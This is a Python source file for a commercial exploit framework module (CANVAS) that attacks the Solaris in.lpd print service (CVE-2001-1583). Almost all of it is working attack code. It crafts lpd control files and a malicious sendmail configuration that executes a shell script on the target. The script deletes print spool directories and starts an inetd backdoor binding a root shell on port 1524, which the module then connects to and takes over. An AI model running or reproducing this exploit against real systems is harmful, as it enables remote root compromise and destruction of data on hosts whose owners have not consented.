#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2003
#http://www.immunityinc.com/CANVAS/ for more information

VERSION = "1.0"

CHANGES = """
"""
NOTES = """
"""

import os,getopt
import sys

sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import socket
import timeoutsocket
from exploitutils import *
import time
from tcpexploit import tcpexploit
import random
import canvasengine

import string
import struct
import random
import select

from libs.ctelnetlib import Telnet
from shelllistener import shelllistener
from shelllistener import shellfromtelnet

import unixShellNode

NAME="in.lpd"

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Sun"
DOCUMENTATION["Date public"]="08/31/2001"
DOCUMENTATION["CERT Advisory"]="http://www.kb.cert.org/vuls/id/39001"
DOCUMENTATION["CVE Name"] = "CVE-2001-1583"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1583"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"]="http://sunsolve.sun.com/pub-cgi/retrieve.pl?doc=fsalert%2F41664&zone_32=category%3Asecurity%20lpd"

DESCRIPTION="in.lpd command execution (Solaris 8)"
# note: http://sunsolve.sun.com/search/document.do?assetkey=1-26-41664-1
# vuln on 2.6 and 2.7 too

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Solaris"] ]
PROPERTY['VERSION'] = [ "_5.6", "_5.7", "5.8" ]

GTK2_DIALOG="dialog.glade2"


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

TYPE_CTRL = "\x02"
TYPE_DATA = "\x03"
BDPORT = 1524
ACK = "\x00"

class LPDException(Exception):
    
    def __init__(self, args=None):
        self.args = args
        
    def __str__(self):
        return `self.args`

class LPDExploit:

    def __init__(self, target, port=515):
        self.set_target(target)
        self.set_port(port)
        self.ack = 1
        #self.stage = 0

    def set_target(self, target):
        try:
            self.targethost = socket.gethostbyname(target)
        except socket.gaierror, err:
            raise LPDException, "LPDExploit, Host: " + target + " " + err[1]

    def get_target(self):
        return self.targethost

    def set_port(self, port):
        self.port = port

    def get_port(self):
        return self.port

    def do_handshake(self):
        
        self.stuff = "\x02" + "/" * 1010 + "CANVA\n"
        self.sck.send(self.stuff)
        self.ack = self.sck.recv(1)

        if self.ack != ACK:
            raise LPDException, "Remote end is not vulnerable."
            return 0

        return 1
        
    def do_xfer_file(self, type, src, dst):
        
        self.req = type + str(len(src)) + " " + dst + "\n"
        
        self.sck.send(self.req)
        
        self.sck.send(src)

        self.ack = self.sck.recv(1)
        
        if self.ack != ACK:
            raise LPDException, "xfer_file marker 0x1 failed"
            return 0
            
        self.sck.send("\x00")

        self.ack = self.sck.recv(1)
        
        if self.ack != ACK:
            raise LPDException, "xfer_file marker 0x2 failed"
            return 0

        return 1

    def do_abort(self):

        self.sck.send("\x02\x21\x0a")

    def do_setup_mail(self, name):
        
        self.mailcf = """#zzt 

V8

Ou0
Og0
OL0
Oeq
OQ/tmp

FX|/bin/sh /var/spool/lp/tmp/%s/script

S3
S0	
R$+	$#local $@blah $:blah
S1
S2
S4
S5

Mlocal	P=/bin/sh, F=S, S=0, R=0, A=sh /var/spool/lp/tmp/%s/script
Mprog	P=/bin/sh, F=S, S=0, R=0, A=sh /var/spool/lp/tmp/%s/script
"""
        return self.mailcf % (name, name, name)
        
    def do_setup_ctrl(self, name):
        
        self.control = """Howned
P\\\"-C/var/spool/lp/tmp/%s/mail.cf\\\" nobody
fdfA666config
fdfA666script
"""
        return self.control % name

    def do_setup_backdoor(self):
        return """#!/bin/sh

PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/ucb:/usr/local/bin:/usr/local/sbin\
:/usr/xpg4/bin ; export PATH

cd /tmp
rm -rf /var/spool/lp/tmp/*
rm -rf /var/spool/lp/requests/*

# Some inetd backdoors. Uncomment wisely... 
rm -f canvas666
echo "ingreslock stream tcp nowait root /bin/sh sh -i" >> canvas666
inetd -s canvas666
rm -f canvas666
"""

    def setup(self):
        
        try:
            self.sck = self.gettcpsock()
            self.sck.connect((self.targethost, self.port))
        except:
            raise LPDException, "LPDExploit communication failure. Host: " + str(self.targethost) + ":"\
                  + str(self.port)

    def calculate_resname(self):
        self.res_name = []
        try:
            self.res_name.append((socket.gethostbyaddr(self.sck.getsockname()[0])[0]).lower())
        except socket.herror:
            pass
        
        self.res_name.append("::ffff:" + self.sck.getsockname()[0])
        self.res_name.append(self.sck.getsockname()[0])
        self.res_name.append(socket.gethostname())

        for each in self.res_name:    
            self.log("adding possible source name: %s" % each)
        
    def exploit(self):
        self.setInfo("%s attacking %s:%d"%(NAME,self.host,self.port))
        self.log("[*] exploiting. the process can take up to 5 minutes. please wait. [*]")
        self.calculate_resname()

        #win32 python required the following
        timeoutsocket.setDefaultSocketTimeout(15)

        for each in self.res_name:
            
            self.log("using source name: %s" % each)
            
            self.do_handshake()
            self.do_xfer_file(TYPE_CTRL, self.do_setup_ctrl(each), "cfA666encpt")
            self.do_xfer_file(TYPE_DATA, self.do_setup_mail(each), "mail.cf")
            self.do_xfer_file(TYPE_DATA, self.do_setup_backdoor(), "script")
            self.do_abort()
            self.sck.close()
        
            self.setup()
            self.do_handshake()
            self.do_xfer_file(TYPE_CTRL, self.do_setup_ctrl(each), "cfA666encpt")
            self.do_xfer_file(TYPE_DATA, "mail.cf", "dfA666config")
            self.do_xfer_file(TYPE_DATA, "script", "dfA666script")
            #print "final recv", self.sck.recv(10)
            self.sck.close()

            self.cnt = 10

            while self.cnt:
                self.cnt -= 1
                time.sleep(10) #need to sleep for good!, lame resolver problems
        
                self.log("[*]  trying to connect to backdoor ...     [*]")
                try:
                    self.t = Telnet(self.targethost, BDPORT)
                except:
                    continue

                self.log("[*]                Success!            [*]")
                self.setInfo("%s attacking %s:%d - done (succeeded!)"%(NAME,self.host,self.port))
                return self.t
                
            self.setup()        #connect again for the next iteration
        
        self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))    
        raise LPDException, "LPDExploit, failed for Host: " + str(self.targethost)



class theexploit(tcpexploit, LPDExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setPort(515)
        self.setHost("")
        self.setVersion(1)
        self.badstring="\x00\\/.:?\r\n%?"
        self.setInfo(DESCRIPTION)
        return

    def createShellcode(self):
        pass
            
    def neededListenerTypes(self):
        return []
        
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        LPDExploit.__init__(self, self.host)
        try:
            self.setup()
        except:
            self.log("in.lpd is not running on the remote end.")
            return 0
        try:
            if self.do_handshake():
                self.log("in.lpd is running and vulnerable on the remote end.")
                self.do_abort()
                self.sck.close()
                return 1
        except:
            pass

        try:
            self.do_abort()
            self.sck.close()
        except:
            pass
        
        self.log("in.lpd is not vulnerable on the remote end.")
        return 0
        
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        try:
            return self.dorun()
        except LPDException, self.expstr:
            self.log(str(self.expstr))
            return 0
        
    def dorun(self):
        LPDExploit.__init__(self, self.host, self.port)
        self.setup()        #do the tcp connection
        self.sess = self.exploit()

        self.log("killing backdoor process and making a CANVAS shell listener")
        try:
            shell=shelllistener(shellfromtelnet(self.sess))
            node=unixShellNode.unixShellNode()
            node.parentnode=self.argsDict["passednodes"][0]
            node.shell=shell
        except :
            self.log("Could not make a shell listener - connection was closed. Exploit most likely failed.")
            import traceback
            print '-'*60
            traceback.print_exc(file=sys.stdout)
            print '-'*60
            return 0
            
        shell.shellcommand("PID=`ps -aef| grep inetd | grep canvas666 | grep -v grep| awk {'print $2'}`; export PID; kill -9 $PID;")
        return node

    #returns the sploitstring
    def makesploit(self):
        pass

    def displayVersions(self):
        print "1 : Solaris 8 Ultra "
        return
    
#this stuff happens.
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    app.options = ["This exploit does _not_ require callback options (-l -d) to be set"]
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()    
